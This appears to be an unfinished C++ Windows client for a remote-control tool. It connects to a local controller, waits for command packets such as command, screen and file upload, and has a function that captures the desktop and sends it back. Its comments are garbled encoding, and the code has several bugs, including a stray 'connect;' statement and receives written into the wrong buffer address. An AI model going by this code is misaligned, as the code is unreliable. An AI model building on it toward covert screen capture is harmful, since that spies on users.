#include<iostream>
#include"../common/CSockinit.h"
#include"../common/proto.h"

using namespace std;
//c2r controller ->remote  ���ƶ˷��͸����ض˵İ�


bool RecvPackage(IN SOCKET sock, OUT PackageHead& hdr, OUT LPBYTE& pDataBuf);
bool SendPackage(IN SOCKET sock, IN PackageHead& hdr, IN LPBYTE pDataBuf);
void OnC2RScreen(IN SOCKET sock);

int main()
{
	/*�����׽���*/
	SOCKET sock = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
	{
		cout << "�����׽���ʧ��";
		return 0;
	}

	sockaddr_in si;
	si.sin_family = AF_INET;
	si.sin_port = htons(0x2710);//��βתСβ�������ֽ���ת�����ֽ���
	si.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");


	int nRet = connect(sock, (sockaddr*)&si, sizeof(si));//����

	if (nRet == SOCKET_ERROR)
	{
		cout << "sock connect err";
		return 0;
	}

	while (true)
	{
		//���ܿ��ƶ˵�����
		PackageHead hdr;
		LPBYTE pDataBuf = NULL;
		if (!RecvPackage(sock, hdr, pDataBuf))
		{
			//����ʧ��
			connect;
		}
		//��������
		switch (hdr.m_command)
		{
		case C2R_CMD:
			break;
		case C2R_SCREEN:
			break;
		case C2R_FILETRAVELS:
			break;
		case C2R_FILEUPLOAD:
			break;
		case R2C_SCREEN:

			break;
		default:
			break;
		}
	}

	return 0;
}

bool RecvPackage(IN SOCKET sock, OUT PackageHead& hdr, OUT LPBYTE& pDataBuf)
{
	//�հ�ͷ ������ؿ���ֱ����4��DWORD���ȣ��������Զ�̵Ļ�������һ�����ղ���DWORD����������ѭ���հ�
	int nRecvLen = 0;			//�յ��İ�ͷ����
	DWORD dwDataLen;			//�������ݳ���
	while (nRecvLen < sizeof(DWORD))
	{
		int nRet = recv(sock, (char*)&dwDataLen + nRecvLen, sizeof(dwDataLen) - nRecvLen, 0);
		nRecvLen += nRet;
	}
	hdr.m_dwDataLen = dwDataLen;




	//�������ݻ�����
	if (hdr.m_dwDataLen == 0)
	{
		return TRUE;
	}

	pDataBuf = new BYTE[hdr.m_dwDataLen];
	if (pDataBuf == NULL)
	{
		return false;
	}

	//������
	nRecvLen = 0;
	while (nRecvLen < hdr.m_dwDataLen)//������յ�����С�ڰ�ͷ�����ĳ���
	{
		int nRet = recv(sock, (char*)&pDataBuf + nRecvLen, hdr.m_dwDataLen - nRecvLen, 0);
		if (nRet == SOCKET_ERROR || nRet == 0)
		{
			delete[] pDataBuf;
			return false;
		}
		nRecvLen += nRet;
	}
	return true;
}

bool SendPackage(IN SOCKET sock, IN const PackageHead& hdr, IN LPBYTE pDataBuf)
{
	//���Ͱ�ͷ
	int nRet = send(sock, (char*)&hdr, sizeof(hdr), 0);
	if (nRet == SOCKET_ERROR)
	{
		return false;
	}


	//��������
	nRet = send(sock, (char*)&pDataBuf, hdr.m_dwDataLen, 0);
	if (nRet == SOCKET_ERROR)
	{
		return false;
	}
	return true;
}
void OnC2RScreen(IN SOCKET sock)
{
	//��ȡ��ĻDC
	HDC hdcScreen = GetWindowDC(NULL);
	DWORD dwScreenWith = GetSystemMetrics(SM_CXSCREEN);//��ȡ��Ļ��
	DWORD dwScreenHeigth = GetSystemMetrics(SM_CYSCREEN);//��ȡ��Ļ��


	//����Ļ���ݿ���������DC��
	HDC hDcMem = CreateCompatibleDC(hdcScreen);
	HBITMAP HBmp = CreateCompatibleBitmap(hdcScreen, dwScreenWith, dwScreenHeigth);
	SelectObject(hDcMem, HBmp);
	BitBlt(hDcMem, 0, 0, dwScreenWith, dwScreenHeigth, hdcScreen, 0, 0, SRCCOPY);

	//��ȡλͼ����
	DWORD dwBitsOfPixel = GetDeviceCaps(hDcMem, BITSPIXEL) / 8;
	DWORD dwBufSize = dwBitsOfPixel * dwScreenWith * dwBitsOfPixel * dwScreenHeigth;
	LPBYTE pBuf = new BYTE[dwBufSize];
	if (pBuf == NULL)
	{
		return;
	}
	memset(pBuf, 0, dwBufSize);

	GetBitmapBits(HBmp, dwBufSize, pBuf);
	//���͵����ƶ�

	SendPackage(sock, PackageHead{ R2C_SCREEN,dwBufSize }, pBuf);

	//�ͷ�
	delete[]pBuf;
	DeleteObject(HBmp);
	DeleteDC(hDcMem);
	ReleaseDC(NULL, hdcScreen);
}